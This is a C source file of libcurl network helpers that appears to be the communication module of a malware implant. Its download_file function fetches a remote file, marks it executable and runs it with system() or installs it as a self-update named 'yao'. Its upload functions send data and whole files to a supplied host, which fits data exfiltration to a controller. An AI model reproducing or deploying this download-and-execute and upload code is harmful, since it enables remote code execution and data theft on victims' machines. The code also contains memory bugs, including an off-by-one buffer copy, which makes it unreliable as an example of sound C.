#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <curl/curl.h>

#include "../include/types.h"
#include "../include/network_utils.h"

struct MemoryStruct
{
	char *memory;
	size_t size;
};

static size_t s_write_data(void *contents, size_t size, size_t nmemb, void *userp)
{
	size_t realsize = size * nmemb;
	struct MemoryStruct *mem = (struct MemoryStruct *)userp;

	char *ptr = realloc(mem->memory, mem->size + realsize + 1);
	if (ptr == NULL)
	{
#ifdef DEBUG
		printf("[ERROR] Realloc returned NULL\n");
#endif
		return 0;
	}

	mem->memory = ptr;
	memcpy(&(mem->memory[mem->size]), contents, realsize);
	mem->size += realsize;
	mem->memory[mem->size] = 0;

	return realsize;
}

static size_t f_write_data(void *ptr, size_t size, size_t nmemb, FILE *stream)
{
	size_t written = fwrite(ptr, size, nmemb, stream);
	return written;
}

int download_data(char *ip_addr, char **response)
{
	CURL *curl_handle;
	CURLcode res;

	struct MemoryStruct chunk;

	chunk.memory = malloc(1);
	chunk.size = 0;

	curl_global_init(CURL_GLOBAL_ALL);

	curl_handle = curl_easy_init();

	curl_easy_setopt(curl_handle, CURLOPT_URL, ip_addr);
	curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, s_write_data);
	curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, (void *)&chunk);

	res = curl_easy_perform(curl_handle);

	if (res != CURLE_OK)
	{
#ifdef DEBUG
		fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
#endif
	}
	else
	{
		*response = (char *)malloc(chunk.size);
		memcpy(*response, chunk.memory, chunk.size + 1);
	}

	curl_easy_cleanup(curl_handle);
	free(chunk.memory);
	curl_global_cleanup();

	return OK;
}

int download_file(char *ip_addr, int execute)
{
	FILE *download = NULL;
	CURL *curl = NULL;
	CURLcode res = 0;

	curl = curl_easy_init();
	if (!curl)
		return ERROR;

	download = fopen(HOME "/download.tmp", "w");
	if (!download)
		return ERROR;

	curl_easy_setopt(curl, CURLOPT_URL, ip_addr);
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, f_write_data);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, download);
	res = curl_easy_perform(curl);
	if (res != CURLE_OK)
		return ERROR;

	chmod(HOME "/download.tmp", S_IXUSR | S_IXGRP | S_IXOTH);

	if (execute == 0)
	{ // executable
		system(HOME "/download.tmp");
	}
	else if (execute == 1)
	{ // update
		system("mv " HOME "/download.tmp " HOME "/yao");
	}
	curl_easy_cleanup(curl);
	curl_global_cleanup();

	fclose(download);

	return OK;
}

int upload_data(char *ip_addr, char *data)
{
	CURL *curl;
	CURLcode res;

	curl = curl_easy_init();
	if (!curl)
	{
		curl_global_cleanup();
	}

	curl_easy_setopt(curl, CURLOPT_URL, ip_addr);
	curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);

	res = curl_easy_perform(curl);

	if (res != CURLE_OK)
#ifdef DEBUG
		fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
#endif

	curl_easy_cleanup(curl);

	return 0;
}

int upload_file(char *ip_addr, FILE *fd)
{
	CURL *curl;
	CURLcode res;
	struct stat file_info;

	if (fstat(fileno(fd), &file_info) != 0)
		return 1;

	curl = curl_easy_init();
	if (!curl)
	{
		fclose(fd);
	}

	curl_easy_setopt(curl, CURLOPT_URL, ip_addr);
	curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
	curl_easy_setopt(curl, CURLOPT_READDATA, fd);
	curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE, (curl_off_t)file_info.st_size);

	curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

	res = curl_easy_perform(curl);
	if (res != CURLE_OK)
	{
#ifdef DEBUG
		fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
#endif
	}

	curl_easy_cleanup(curl);

	fclose(fd);
	return 0;
}
